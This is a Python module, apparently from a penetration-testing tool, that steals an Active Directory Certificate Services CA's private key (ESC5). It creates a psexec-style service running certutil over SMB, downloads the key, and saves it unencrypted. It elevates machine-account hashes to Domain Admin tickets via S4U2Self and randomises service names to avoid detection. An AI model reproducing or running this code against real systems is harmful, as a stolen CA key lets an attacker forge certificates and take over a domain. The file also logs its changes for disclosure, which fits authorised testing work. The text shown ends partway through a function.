"""Native ADCS CA private-key backup.

Replaces ``certipy ca -backup`` subprocess.  Implements the same primitive that
certipy uses (``commands/ca.py:backup``) — service-creation chain over MS-SCMR
plus SMB file fetch — but as a long-lived ADscan service module:

* one async coroutine, one SMB connection reused for SCM RPC + file IO
* randomised service name + temp directory per run (anti-collision when the
  same operator runs the chain repeatedly, and harder to flag than the static
  ``Certipy`` service name)
* cleanup that always runs (delete temp file, delete service) — even on
  partial failure
* structural validation of the recovered PFX (issuer matches subject for a
  root CA, BasicConstraints cA=True, RSA private key present)
* premium Rich UX panel matching the rest of ``services/adcs``

The implementation deliberately uses the **service-creation** strategy as the
primary path because it has 100% compatibility with every AD CS deployment
since 2003.  A second mode using ``ICertAdminD2`` MS-CSRA RPC over DCOM
(``BackupOpenFile``/``BackupReadFile``) is left as a clearly-marked extension
point for stealthier ops — aiosmb already exposes the DCOM machinery
(``aiosmb.dcerpc.v5.dcom``) so adding it later is incremental.

Public entry point: :func:`ca_backup_native`.
"""

from __future__ import annotations

import asyncio
import secrets
import urllib.parse
from contextlib import AsyncExitStack
from dataclasses import dataclass, replace
from pathlib import Path
from typing import Any, Optional

from adscan_internal import telemetry
from adscan_internal.services.kerberos_tcp_target import resolve_kerberos_tcp_target
from adscan_core.rich_output import (
    get_console,
    mark_sensitive,
    print_error,
    print_info_verbose,
    print_warning,
)
from adscan_core.rich_output import print_exception


# Default service-creation strategy parameters.
_DEFAULT_TEMP_DIR = r"C:\Windows\Tasks"
# Single-character literal password for the temp PFX.  Plain string so the
# command line stays simple; the PFX itself is short-lived (deleted as part of
# cleanup) and we re-encrypt to NoEncryption when we hand it back.
_TEMP_PFX_PASSWORD = "adscan"


@dataclass(frozen=True)
class CABackupConfig:
    """Inputs for a CA private-key backup.

    Args:
        target_host: CA server IP or FQDN — must be SMB-reachable on 445.
        domain: AD domain hosting the CA (Kerberos realm).
        username: Account performing the backup; needs *local admin* on the CA
            (member of ``Administrators`` or ``Domain Admins``) to create a
            service and read C$/ADMIN$.
        password: Plaintext password (preferred over ``nt_hash``).
        nt_hash: NT hash, used when password is unknown (RC4 Kerberos).
        kdc_ip: Domain KDC.  Defaults to ``target_host`` when ``None`` — works
            for the common case of CA collocated on a DC; misconfiguration
            against a member-server CA must pass this explicitly.
        target_fqdn: CA's Kerberos SPN target (for ``cifs/<fqdn>``).  Auto-
            resolved via reverse DNS when ``target_host`` is an IP.
        service_name: Optional override for the temporary service name.
            Defaults to ``ADscan_<8-hex>``.  Useful when the operator wants
            to mimic an existing benign service for stealth.
        temp_dir: Remote directory under ``C:\\`` that the temp PFX is written
            to before download.  Default ``C:\\Windows\\Tasks``.
        timeout_s: Total operation timeout (service start + file appearance +
            fetch + cleanup).  Default 60s — certutil typically completes in
            under 5s, but slow CAs / large keys can stretch.
    """

    target_host: str
    domain: str
    username: str
    password: Optional[str] = None
    nt_hash: Optional[str] = None
    aes_key: Optional[str] = None
    kdc_ip: Optional[str] = None
    target_fqdn: Optional[str] = None
    service_name: Optional[str] = None
    temp_dir: str = _DEFAULT_TEMP_DIR
    timeout_s: int = 60
    ip_hostname_inventory: Optional[dict[str, list[str]]] = None
    # Split-DC/DNS (issue #15): a SEPARATE AD-zone DNS server for segmented
    # networks. When set, the CA-host A/PTR resolution queries this server
    # instead of the DC/KDC (``kdc_ip``). ``None`` -> the DC resolves,
    # byte-identical to before.
    dns_server: Optional[str] = None
    # Path to a .ccache holding a ready-to-use TGS/TGT for the CA host. When set
    # it takes precedence over password/nt_hash and drives a
    # ``smb+kerberos-ccache`` bind. Populated automatically by the S4U2Self
    # machine-account elevation (see ``ca_backup_native``); a caller may also set
    # it directly to bind with an explicit ticket.
    ccache_path: Optional[str] = None
    # Domain Admin (or other local admin) to impersonate when the credential is
    # the CA host's own machine account and must be elevated via S4U2Self. When
    # None the elevation defaults to ``Administrator`` (RID 500), a local admin
    # on every domain-joined host.
    impersonate_target: Optional[str] = None

    def __post_init__(self) -> None:
        # Auto-route an NT hash that landed in the password field. See
        # services/credential_routing.py for the rationale.
        from adscan_internal.services.credential_routing import (
            promote_credential_fields,
        )

        new_pwd, new_hash, _, _ = promote_credential_fields(
            password=self.password, nt_hash=self.nt_hash
        )
        if new_pwd != self.password:
            object.__setattr__(self, "password", new_pwd)
        if new_hash != self.nt_hash:
            object.__setattr__(self, "nt_hash", new_hash)


@dataclass
class CABackupResult:
    """Outcome of a CA backup attempt.

    Attributes:
        success: Whether a usable CA PFX was retrieved.
        pfx_path: Path to the unencrypted CA PFX written into ``output_dir``.
        ca_subject: Subject DN of the recovered CA cert (for display).
        is_root_ca: True when the CA is self-signed (issuer == subject).
        key_size_bits: RSA key size of the CA private key.
        error: Human-readable error on failure.
    """

    success: bool
    pfx_path: Optional[Path] = None
    ca_subject: Optional[str] = None
    is_root_ca: bool = False
    key_size_bits: Optional[int] = None
    error: Optional[str] = None


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------


def _q(v: str) -> str:
    return urllib.parse.quote(v, safe="")


def _build_smb_url(config: CABackupConfig) -> str:
    """Compose an aiosmb SMB URL for the SMB connection used by SCM + file IO.

    Uses the CA's FQDN as the URL host whenever available — the Kerberos SPN
    is derived from ``SMBTarget.hostname``, so passing an IP yields
    ``KDC_ERR_S_PRINCIPAL_UNKNOWN`` against the realm.  ``dc=`` carries the
    KDC IP for AS-REQ routing.
    """
    if config.ccache_path:
        # An elevated (S4U2Self) or explicitly-supplied ticket wins over any
        # raw secret — the ccache principal is the one that owns local admin.
        scheme = "smb+kerberos-ccache"
        secret = _q(config.ccache_path)
    elif config.password:
        scheme = "smb+kerberos-password"
        secret = _q(config.password)
    elif config.nt_hash:
        scheme = "smb+kerberos-nt"
        secret = _q(config.nt_hash)
    else:
        raise ValueError(
            "CABackupConfig must supply a ccache_path, password or nt_hash"
        )

    domain_q = _q(config.domain.upper())
    user_q = _q(config.username)
    # Prefer FQDN over IP so the Kerberos SPN ``cifs/<host>@<realm>`` resolves.
    target = resolve_kerberos_tcp_target(
        target_host=config.target_host,
        spn_host=_resolve_target_fqdn(config),
        resolver_ip=config.kdc_ip or None,
        dns_server=config.dns_server or None,
        domain=config.domain,
        ip_hostname_inventory=config.ip_hostname_inventory,
    )
    from adscan_internal.services._kerberos_spn import (
        require_kerberos_target_hostname,
    )

    spn_host = require_kerberos_target_hostname(target.spn_host, protocol="SMB")
    params: list[str] = []
    if target.server_ip:
        params.append(f"serverip={_q(target.server_ip)}")
    url = f"{scheme}://{domain_q}\\{user_q}:{secret}@{spn_host}"
    kdc = config.kdc_ip or config.target_host
    if kdc:
        params.append(f"dc={_q(kdc)}")
    if params:
        url += f"/?{'&'.join(params)}"
    return url


def _resolve_target_fqdn(config: CABackupConfig) -> Optional[str]:
    """Best-effort FQDN — Kerberos SPN target.  Mirrors ``cert_request._resolve_ca_hostname``."""
    if config.target_fqdn:
        return config.target_fqdn
    host = config.target_host
    if host and not host.replace(".", "").isdigit():
        return host
    try:
        import socket

        return socket.gethostbyaddr(host)[0]
    except Exception:  # noqa: BLE001
        return None


def _build_backup_cmd(temp_dir: str, run_id: str, password: str) -> tuple[str, str]:
    """Compose the cmd.exe payload that drives certutil + final move.

    Returns ``(binary_path, expected_pfx_unc_subpath)`` where the second value
    is the path *under the share root* (e.g. ``Windows\\Tasks\\adscan_<id>.pfx``)
    that the caller should poll for via SMB.
    """
    # certutil writes ``<dir>\<CAName>.p12`` and ``<dir>\<CAName>.crt``.  The
    # ``move /y * <name>.pfx`` collapses the .p12 into a known name; the .crt
    # is harmless collateral that the cleanup step removes.
    backup_dir = f"{temp_dir}\\adscan_{run_id}"
    final_pfx = f"{temp_dir}\\adscan_{run_id}.pfx"
    bin_path = (
        "cmd.exe /c "
        f'certutil -backupkey -f -p {password} "{backup_dir}" '
        f'&& move /y "{backup_dir}\\*.p12" "{final_pfx}" '
        f'&& rmdir /s /q "{backup_dir}"'
    )
    # Strip drive letter; share is C$ (root = C:\), so subpath is everything
    # after the ``C:\`` prefix.
    if final_pfx.upper().startswith("C:\\"):
        unc_subpath = final_pfx[3:]  # e.g. ``Windows\Tasks\adscan_<id>.pfx``
    else:
        unc_subpath = final_pfx.lstrip("\\")
    return bin_path, unc_subpath


def _build_cleanup_cmd(temp_dir: str, run_id: str) -> str:
    """Idempotent cleanup payload — removes the temp PFX/dir if they survived."""
    backup_dir = f"{temp_dir}\\adscan_{run_id}"
    final_pfx = f"{temp_dir}\\adscan_{run_id}.pfx"
    return (
        f'cmd.exe /c del /f /q "{final_pfx}" 2>NUL & rmdir /s /q "{backup_dir}" 2>NUL'
    )


def _render_preflight(config: CABackupConfig, service_name: str, temp_dir: str) -> None:
    """Pre-flight panel — operationally important so the operator sees the noise."""
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text

    grid = Table.grid(padding=(0, 1), expand=False)
    grid.add_column(style="dim", justify="right", min_width=14)
    grid.add_column(style="bold")
    grid.add_row("CA host", mark_sensitive(config.target_host, "hostname"))
    grid.add_row("Realm", mark_sensitive(config.domain, "domain"))
    grid.add_row("User", f"{mark_sensitive(config.username, 'user')}")
    grid.add_row("Strategy", "[red]Service-creation[/] (psexec-style)")
    grid.add_row("Service name", f"[yellow]{service_name}[/] [dim](random)[/]")
    grid.add_row("Temp dir", mark_sensitive(temp_dir, "path"))
    grid.add_row(
        "Detection",
        "[dim]EID 7045 (service install) + 4688 (certutil.exe)[/]",
    )
    title = Text("  CA Private-Key Backup  ", style="bold white on red")
    panel = Panel(grid, title=title, border_style="red", padding=(1, 2))
    get_console().print(panel)


def _render_result(result: CABackupResult) -> None:
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text

    grid = Table.grid(padding=(0, 1), expand=False)
    grid.add_column(style="dim", justify="right", min_width=14)
    grid.add_column()
    if result.success and result.pfx_path:
        grid.add_row("Status", "[bold green]✓ BACKED UP[/]")
        grid.add_row("CA subject", str(result.ca_subject or ""))
        grid.add_row(
            "Cert role",
            "[red]ROOT CA[/]" if result.is_root_ca else "[yellow]subordinate CA[/]",
        )
        if result.key_size_bits:
            grid.add_row("Private key", f"RSA {result.key_size_bits} bits")
        grid.add_row("PFX path", mark_sensitive(str(result.pfx_path), "path"))
        title = Text("  CA Backup Successful  ", style="bold white on green")
        border = "green"
    else:
        grid.add_row("Status", "[bold red]✗ FAILED[/]")
        grid.add_row("Reason", result.error or "(unknown)")
        title = Text("  CA Backup Failed  ", style="bold white on red")
        border = "red"
    panel = Panel(grid, title=title, border_style=border, padding=(1, 2))
    get_console().print(panel)


async def _wait_for_pfx_on_share(
    machine,
    share: str,
    unc_subpath: str,
    timeout_s: int,
) -> Optional[bytes]:
    """Poll the target share until the temp PFX appears, then download it.

    aiosmb's ``Machine.get_file_data`` async-iterates chunks; we accumulate
    them into a single bytes object since CA PFXes are typically <100KB.
    """
    from aiosmb.commons.interfaces.file import SMBFile

    deadline = asyncio.get_event_loop().time() + timeout_s
    unc = (
        f"\\\\{machine.connection.target.get_hostname_or_ip()}\\{share}\\{unc_subpath}"
    )
    last_err: Optional[Exception] = None
    while asyncio.get_event_loop().time() < deadline:
        file_obj = SMBFile.from_uncpath(unc)
        try:
            chunks: list[bytes] = []
            async for chunk, err in machine.get_file_data(file_obj):
                if err is not None:
                    raise err
                if chunk is None:
                    break
                chunks.append(chunk)
            data = b"".join(chunks)
            if data:
                return data
        except Exception as exc:  # noqa: BLE001
            last_err = exc
        finally:
            # CRITICAL: get_file_data opens the file but never closes it. Leaving
            # the read handle open (without FILE_SHARE_DELETE) on this connection
            # makes the later cleanup delete fail with a sharing violation until
            # the connection is torn down — which is exactly how the temp CA key
            # file was surviving on the CA host. Close it after every attempt.
            try:
                await file_obj.close()
            except Exception:  # noqa: BLE001
                pass
        await asyncio.sleep(1.0)
    if last_err is not None:
        print_info_verbose(
            f"  ▸ PFX poll timed out after {timeout_s}s — last error: "
            f"{type(last_err).__name__}: {last_err}"
        )
    return None


async def _open_smb_and_scm(config: CABackupConfig):
    """Open the SMB connection, attach a target FQDN, and bootstrap SCM RPC.

    Returns ``(connection, scm_manager)``.  Caller is responsible for closing
    both — wrap in try/finally.
    """
    from aiosmb.commons.connection.factory import SMBConnectionFactory
    from aiosmb.dcerpc.v5.interfaces.servicemanager import REMSVCRPC

    url = _build_smb_url(config)
    su = SMBConnectionFactory.from_url(url)
    # Force the IP so the TCP connect lands on the right box even when the
    # FQDN was used to drive the Kerberos SPN.  Mutating ``su.target`` (not
    # the copy from ``get_target()``) is required because ``get_connection``
    # passes a fresh copy back through.
    if config.target_host and config.target_host.replace(".", "").isdigit():
        su.target.ip = config.target_host

    conn = su.get_connection()
    _, err = await conn.login()
    if err is not None:
        raise err

    scm, err = await REMSVCRPC.from_smbconnection(conn, perform_dummy=True)
    if err is not None:
        raise err
    return conn, scm


def _validate_recovered_pfx(
    pfx_bytes: bytes, password: str
) -> tuple[Optional[object], Optional[object], Optional[str]]:
    """Parse the temp PFX and confirm we have a CA-shaped key+cert pair.

    Returns ``(key, cert, error)`` — error is None on success.
    """
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives.serialization import pkcs12

    try:
        key, cert, _ = pkcs12.load_key_and_certificates(
            pfx_bytes, password.encode() if password else b""
        )
    except Exception as exc:  # noqa: BLE001
        return None, None, f"PFX parse failed: {type(exc).__name__}: {exc}"
    if cert is None or key is None:
        return None, None, "PFX missing key or certificate."
    if not isinstance(key, rsa.RSAPrivateKey):
        return (
            None,
            None,
            "CA private key is not RSA — incompatible with forge service.",
        )
    return key, cert, None


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------


async def _elevate_ca_backup_config_if_machine_account(
    config: CABackupConfig,
    stack: "AsyncExitStack",
) -> CABackupConfig:
    """Elevate a CA-host machine-account credential to a local-admin ccache.

    CA private-key backup runs ``certutil -backupkey`` as SYSTEM through a
    transient service, which requires ``SC_MANAGER_CREATE_SERVICE`` — i.e. local
    admin on the CA host. A domain **computer account** authenticating over the
    network is NOT a member of the host's local Administrators group, so the
    machine-account credential alone dead-ends at ``OpenSCManager`` with
    ``rpc_s_access_denied`` even though Kerberos auth itself succeeds.

    When the credential IS the CA host's own machine account, transparently
    elevate via **S4U2Self**: mint a self-service ticket to ``cifs/<ca-host>``
    impersonating a Domain Admin (``Administrator`` by default, or
    ``config.impersonate_target``) — the exact primitive the credential-dump
    path uses (:mod:`machine_account_elevation`). The impersonated principal is a
    local admin on the CA host, so the SCM bind then carries the rights the
    backup needs.

    Any non-machine-account credential (a real local-admin password, an explicit
    ccache) is returned unchanged. Elevation is best-effort: on any failure the
    original machine-account config is returned so the caller still surfaces the
    honest ``access_denied`` rather than a masked error.
    """
    if config.ccache_path:
        # Caller already supplied a ready ticket — respect it, no elevation.
        return config

    from adscan_internal.services.exploitation.machine_account_elevation import (
        elevated_smb_config,
        is_dc_machine_account,
    )

    spn_host = config.target_fqdn or config.target_host
    if not is_dc_machine_account(config.username, spn_host):
        return config
    if not (config.nt_hash or config.aes_key):
        # No re-mintable secret to drive S4U2Self with.
        return config

    from adscan_internal.services.smb_transport import SMBConfig

    smb_cfg = SMBConfig(
        target_ip=config.target_host,
        target_hostname=spn_host,
        domain=config.domain,
        username=config.username,
        nt_hash=config.nt_hash,
        aes_key=config.aes_key,
        kdc_ip=config.kdc_ip,
        use_kerberos=True,
    )
    elevated = await stack.enter_async_context(
        elevated_smb_config(smb_cfg, target_user=config.impersonate_target)
    )
    if not elevated.ccache_path:
        # Elevation did not fire (not a machine account) or fell back on failure.
        return config
    return replace(
        config,
        username=elevated.username or config.username,
        ccache_path=elevated.ccache_path,
        nt_hash=None,
        aes_key=None,
        password=None,
    )


async def ca_backup_native(
    config: CABackupConfig,
    output_dir: Path,
    *,
    shell: Any = None,
    domain: Optional[str] = None,
    technique: str = "AD CS ESC5 — CA private-key backup",
) -> CABackupResult:
    """Public CA-backup entry point — S4U2Self-elevates then delegates.

    When ``config`` carries the CA host's own machine-account credential (the
    common case for ESC5, where the CA-host machine hash is recovered from an
    LSA/SAM dump), this wrapper transparently elevates it to a local-admin ccache
    via S4U2Self before running the backup — see
    :func:`_elevate_ca_backup_config_if_machine_account`. The elevated ccache
    lives for exactly the duration of the backup and is cleaned up on exit. All
    other credentials pass through unchanged. The operational model lives in
    :func:`_ca_backup_native_impl`.
    """
    async with AsyncExitStack() as stack:
        config = await _elevate_ca_backup_config_if_machine_account(config, stack)
        return await _ca_backup_native_impl(
            config,
            output_dir,
            shell=shell,
            domain=domain,
            technique=technique,
        )


async def _ca_backup_native_impl(
    config: CABackupConfig,
    output_dir: Path,
    *,
    shell: Any = None,
    domain: Optional[str] = None,
    technique: str = "AD CS ESC5 — CA private-key backup",
) -> CABackupResult:
    """Backup the CA private key + cert via the service-creation strategy.

    Environment-change disclosure (AD CS ESC5): when ``shell`` carries an
    ``environment_change_ledger``, the transient service and the temporary key
    file are registered write-ahead (before the service is created), and the
    exfiltrated CA private key is disclosed on success. The service/file records
    resolve to reverted-confirmed only on a verified delete, otherwise
    ``manual_required`` — a survived artifact on the CA host is always disclosed.
    Disclosure lives here in the primitive so every caller inherits it.

    Args:
        config: CA backup inputs (host, realm, credential).
        output_dir: Where the recovered CA PFX is written.
        shell: Optional session shell carrying ``environment_change_ledger``.
        domain: Ledger domain for the disclosure (defaults to ``config.domain``).
        technique: Ledger ``method`` recorded on each disclosure record.

    Operational model:
      1. Open an SMB connection authenticated as ``config.username``.
      2. Open an SCM/svcctl RPC session over that SMB connection.
      3. Create a transient service whose binary path is a chained
         ``cmd.exe /c certutil -backupkey ...`` → ``move`` → ``rmdir``.
      4. Start the service.  Windows reports "service start failed" because
         cmd.exe exits without calling ``SetServiceStatus`` — that's expected
         and we ignore the error.
      5. Poll ``\\<host>\\C$\\<temp_dir>\\<run_id>.pfx`` over SMB until the
         file appears (or ``timeout_s`` elapses).
      6. Download the PFX, repackage it as ``NoEncryption()`` and write to
         ``output_dir``.
      7. Cleanup (always): delete the temp file/dir on the share, delete the
         service.

    Returns a :class:`CABackupResult` with the recovered PFX path and CA
    metadata, or a populated ``error`` field on any failure.
    """
    from adscan_internal.services.adcs import esc_cleanup as _esc_cleanup

    run_id = secrets.token_hex(4)
    service_name = config.service_name or f"ADscan_{run_id}"
    bin_path, unc_subpath = _build_backup_cmd(
        config.temp_dir, run_id, _TEMP_PFX_PASSWORD
    )
    cleanup_cmd = _build_cleanup_cmd(config.temp_dir, run_id)
    ledger_domain = domain or config.domain
    # The on-host path the client's sysadmin acts on (C:\... form, not the UNC).
    remote_pfx_path = f"{config.temp_dir}\\adscan_{run_id}.pfx"

    _render_preflight(config, service_name, config.temp_dir)

    conn = None
    scm = None
    service_created = False
    service_change_id: Optional[str] = None
    pfx_change_id: Optional[str] = None
    pfx_observed = False
    try:
        try:
            conn, scm = await _open_smb_and_scm(config)
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_exception(exception=exc)
            result = CABackupResult(
                success=False,
                error=f"SMB/SCM bootstrap failed: {type(exc).__name__}: {exc}",
            )
            _render_result(result)
            return result

        # --- Disclose the transient artifacts write-ahead ------------------
        # Registered BEFORE create_service so a session killed mid-creation
        # still leaves a record; they are resolved (reverted/manual) in the
        # finally after a verified delete.
        service_change_id = _esc_cleanup.register_ca_backup_service(
            shell,
            domain=ledger_domain,
            technique=technique,
            service_name=service_name,
            ca_host=config.target_host,
        )
        pfx_change_id = _esc_cleanup.register_ca_backup_temp_pfx(
            shell,
            domain=ledger_domain,
            technique=technique,
            unc_path=remote_pfx_path,
            ca_host=config.target_host,
        )

        # --- Create service ------------------------------------------------
        print_info_verbose(
            f"  ▸ Creating transient service [yellow]{service_name}[/]..."
        )
        _, err = await scm.create_service(service_name, service_name, bin_path)
        if err is not None:
            result = CABackupResult(
                success=False,
                error=(
                    f"CreateService failed: {err}.  Ensure the credential has "
                    "local admin on the CA host (Administrators / Domain Admins)."
                ),
            )
            _render_result(result)
            return result
        service_created = True

        # --- Start service (expected to "fail" — cmd.exe exits) -----------
        print_info_verbose("  ▸ Starting service (cmd.exe runs certutil)...")
        try:
            await scm.start_service(service_name)
        except Exception:  # noqa: BLE001 — expected path
            pass

        # --- Poll for the PFX appearing on the share ----------------------
        print_info_verbose(
            f"  ▸ Waiting for PFX on \\\\{config.target_host}\\C$\\{unc_subpath}..."
        )
        from aiosmb.commons.interfaces.machine import SMBMachine

        machine = SMBMachine(conn)
        pfx_bytes = await _wait_for_pfx_on_share(
            machine, "C$", unc_subpath, config.timeout_s
        )
        if not pfx_bytes:
            result = CABackupResult(
                success=False,
                error=(
                    f"Backup PFX did not appear on C$\\{unc_subpath} after "
                    f"{config.timeout_s}s.  certutil likely failed on the CA — "
                    "verify the credential is in the CA's local Administrators "
                    "group and that certutil.exe is in PATH on the target."
                ),
            )
            _render_result(result)
            return result

        # The temp PFX was observed on the CA host — its disclosure record now
        # tracks a file that really exists (resolved in the finally).
        pfx_observed = True

        # --- Validate + repackage ----------------------------------------
        key, cert, err_str = _validate_recovered_pfx(pfx_bytes, _TEMP_PFX_PASSWORD)
        if err_str:
            result = CABackupResult(success=False, error=err_str)
            _render_result(result)
            return result

        from cryptography.hazmat.primitives.serialization import (
            NoEncryption,
            pkcs12,
        )
        from cryptography import x509 as cx509

        is_root = cert.issuer == cert.subject
        try:
            bc_ext = cert.extensions.get_extension_for_class(cx509.BasicConstraints)
            if not bc_ext.value.ca:
                print_warning(
                    "Recovered cert has BasicConstraints.cA=False — unusual for a CA. "
                    "Forging may still work but the CA was not correctly identified."
                )
        except cx509.ExtensionNotFound:
            print_warning("Recovered cert has no BasicConstraints extension — unusual.")

        ca_subject = cert.subject.rfc4514_string()
        # Filename: take CN from the subject if present, else first attribute.
        try:
            cn_attr = cert.subject.get_attributes_for_oid(cx509.NameOID.COMMON_NAME)
            cn = cn_attr[0].value if cn_attr else "ca"
        except Exception:  # noqa: BLE001
            cn = "ca"
        safe_cn = "".join(c if c.isalnum() or c in "-_" else "_" for c in str(cn))[:64]

        output_dir.mkdir(parents=True, exist_ok=True)
        pfx_path = output_dir / f"{safe_cn}_{run_id}.pfx"
        pfx_path.write_bytes(
            pkcs12.serialize_key_and_certificates(
                name=safe_cn.encode(),
                key=key,
                cert=cert,
                cas=None,
                encryption_algorithm=NoEncryption(),
            )
        )

        # Disclose the exfiltrated CA private key — a permanent CA compromise
        # with no per-object revert, so this is always a manual cleanup item.
        _esc_cleanup.register_ca_private_key_exfiltrated(
            shell,
            domain=ledger_domain,
            technique=technique,
            ca_subject=ca_subject,
            ca_name=str(cn) if cn else None,
            ca_host=config.target_host,
            is_root_ca=is_root,
            key_size_bits=getattr(key, "key_size", None),
            pfx_path=str(pfx_path),
        )

        result = CABackupResult(
            success=True,
            pfx_path=pfx_path,
            ca_subject=ca_subject,
            is_root_ca=is_root,
            key_size_bits=getattr(key, "key_size", None),
        )
        _render_result(result)
        return result
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        print_error(f"CA backup raised: {type(exc).__name__}: {exc}")
        result = CABackupResult(success=False, error=str(exc))
        _render_result(result)
        return result
    finally:
        # ----- Cleanup: remove BOTH transient artifacts, then VERIFY ------
        # The service and the temp PFX are genuinely reversible, so we actively
        # remove them (with retries, since certutil can briefly hold the file)
        # and re-read to confirm. Only a verified removal marks the ledger
        # reverted-confirmed; a survived or unconfirmable artifact lands as
        # manual_required. Cleanup never raises into the caller — a failed
        # cleanup must not fail the exploit or the scan; the ledger carries the
        # truth either way. Order: PFX first (it may need the service to delete
        # it), then the service.
        pfx_gone = await _remove_temp_pfx_verified(
            conn, scm, service_name, service_created, unc_subpath, cleanup_cmd
        )
        service_gone: Optional[bool] = None
        if scm is not None and service_created:
            service_gone = await _remove_service_verified(scm, service_name)
        # Resolve the write-ahead disclosure records honestly.
        _esc_cleanup.resolve_ca_backup_service(
            shell,
            service_change_id,
            created=service_created,
            verified_gone=service_gone,
            service_name=service_name,
            ca_host=config.target_host,
        )
        _esc_cleanup.resolve_ca_backup_temp_pfx(
            shell,
            pfx_change_id,
            observed=pfx_observed,
            gone=pfx_gone,
            unc_path=remote_pfx_path,
        )
        # Tear down.
        if conn is not None:
            try:
                await conn.disconnect()
            except Exception:  # noqa: BLE001
                pass


async def _smb_delete_path(conn, share: str, unc_subpath: str) -> None:
    """Best-effort SMB delete of the temp PFX file.  Silently ignores misses."""
    from aiosmb.commons.interfaces.file import SMBFile

    # SMBFile.delete(self) takes no args; delete_unc(connection, uncpath) is the
    # correct one-shot static API. The previous ``file_obj.delete(conn)`` raised
    # TypeError on every call, leaving the temp PFX on the CA host.
    unc = f"\\\\{conn.target.get_hostname_or_ip()}\\{share}\\{unc_subpath}"
    await SMBFile.delete_unc(conn, unc)


_NOT_FOUND_MARKERS = (
    "NOT_FOUND",
    "NO_SUCH_FILE",
    "OBJECT_NAME_NOT_FOUND",
    "OBJECT_PATH_NOT_FOUND",
)


async def _smb_path_gone(conn, share: str, unc_subpath: str) -> Optional[bool]:
    """Verify the temp PFX's absence on the share after cleanup.

    Returns ``True`` when the file is provably gone (a not-found error opening
    it), ``False`` when it is still present (a read chunk came back), and
    ``None`` when absence could not be confirmed (an ambiguous error or a dead
    connection). We NEVER report a CA key file as gone from an ambiguous error —
    ``None`` routes the disclosure to ``manual_required``.
    """
    from aiosmb.commons.interfaces.file import SMBFile
    from aiosmb.commons.interfaces.machine import SMBMachine

    unc = f"\\\\{conn.target.get_hostname_or_ip()}\\{share}\\{unc_subpath}"
    try:
        machine = SMBMachine(conn)
        file_obj = SMBFile.from_uncpath(unc)
        async for chunk, err in machine.get_file_data(file_obj):
            if err is not None:
                msg = str(err).upper()
                if any(marker in msg for marker in _NOT_FOUND_MARKERS):
                    return True
                return None
            # A chunk (even None end-marker) means the open succeeded: present.
            return False
        return False
    except Exception as exc:  # noqa: BLE001
        msg = str(exc).upper()
        if any(marker in msg for marker in _NOT_FOUND_MARKERS):
            return True
        return None


async def _smb_dir_gone(conn, share: str, dir_subpath: str) -> Optional[bool]:
    """Verify the temp working directory's absence.  Returns True/False/None.

    ``True`` when a listing of the directory returns not-found, ``False`` when it
    lists (still present), ``None`` when absence could not be confirmed.
    """
    from aiosmb.commons.interfaces.directory import SMBDirectory

    unc = f"\\\\{conn.target.get_hostname_or_ip()}\\{share}\\{dir_subpath}"
    try:
        directory = SMBDirectory.from_uncpath(unc)
        _, err = await directory.list(conn)
        if err is not None:
            msg = str(err).upper()
            if any(marker in msg for marker in _NOT_FOUND_MARKERS):
                return True
            return None
        return False
    except Exception as exc:  # noqa: BLE001
        msg = str(exc).upper()
        if any(marker in msg for marker in _NOT_FOUND_MARKERS):
            return True
        return None


async def _remove_temp_pfx_verified(
    conn,
    scm,
    service_name: str,
    service_created: bool,
    unc_subpath: str,
    cleanup_cmd: str,
) -> Optional[bool]:
    """Delete the temp key file AND its working directory, then VERIFY.

    The backup writes both ``adscan_<id>.pfx`` (the moved private key) and the
    working directory ``adscan_<id>\\`` (certutil's ``.crt`` collateral) under
    ``C:\\Windows\\Tasks``. We first delete the sensitive ``.pfx`` silently over
    SMB (retrying, since certutil can briefly hold it), then run the
    service-driven ``del`` + recursive ``rmdir`` to clear the working directory
    a plain SMB delete cannot remove while it is non-empty. Returns ``True`` only
    when BOTH the file and the directory are verified gone; ``False`` when either
    is still present; ``None`` when the verification could not run.
    """
    if conn is None:
        return None
    dir_subpath = unc_subpath[:-4] if unc_subpath.lower().endswith(".pfx") else None

    # Fast, silent path for the sensitive key file.
    for _ in range(2):
        try:
            await _smb_delete_path(conn, "C$", unc_subpath)
        except Exception:  # noqa: BLE001
            pass
        if await _smb_path_gone(conn, "C$", unc_subpath) is True:
            break
        await asyncio.sleep(1.0)

    # If the file or the working directory still remain, run the service-driven
    # cleanup (``del /f /q <pfx>`` + ``rmdir /s /q <dir>``) which removes the
    # non-empty directory recursively on the host.
    pfx_gone = await _smb_path_gone(conn, "C$", unc_subpath)
    dir_gone: Optional[bool] = True
    if dir_subpath:
        dir_gone = await _smb_dir_gone(conn, "C$", dir_subpath)
    if (pfx_gone is not True or dir_gone is not True) and scm is not None and service_created:
        try:
            await _scm_change_binpath(scm, service_name, cleanup_cmd)
            try:
                await scm.start_service(service_name)
            except Exception:  # noqa: BLE001
                pass
        except Exception:  # noqa: BLE001
            pass
        await asyncio.sleep(1.5)
        pfx_gone = await _smb_path_gone(conn, "C$", unc_subpath)
        if dir_subpath:
            dir_gone = await _smb_dir_gone(conn, "C$", dir_subpath)

    if pfx_gone is True and dir_gone is True:
        return True
    if pfx_gone is False or dir_gone is False:
        return False
    return None


async def _remove_service_verified(scm, service_name: str) -> Optional[bool]:
    """Delete the transient service and VERIFY its absence.  True/False/None.

    ``DeleteService`` only MARKS the service for deletion; the record is removed
    when the last open handle closes. So we delete, close our create handle, and
    re-open — a not-found on re-open is the genuine confirmation the service is
    gone. Returns ``True`` when verified absent, ``False`` when it still opens,
    ``None`` when the verification itself could not run.
    """
    try:
        await scm.delete_service(service_name)
    except Exception:  # noqa: BLE001
        pass
    # Close our create handle so the pending deletion completes.
    try:
        await scm.close_service(service_name)
    except Exception:  # noqa: BLE001
        pass
    # Re-open to verify: not-found means the service is genuinely gone.
    try:
        reopen_ok, reopen_err = await scm.open_service(service_name)
    except Exception:  # noqa: BLE001
        return None
    if reopen_err is not None:
        return True
    # Still openable — the service survived. Close the handle we just opened.
    try:
        await scm.close_service(service_name)
    except Exception:  # noqa: BLE001
        pass
    return False


async def _scm_change_binpath(scm, service_name: str, new_bin_path: str) -> None:
    """Update an existing service's binary path via hRChangeServiceConfigW.

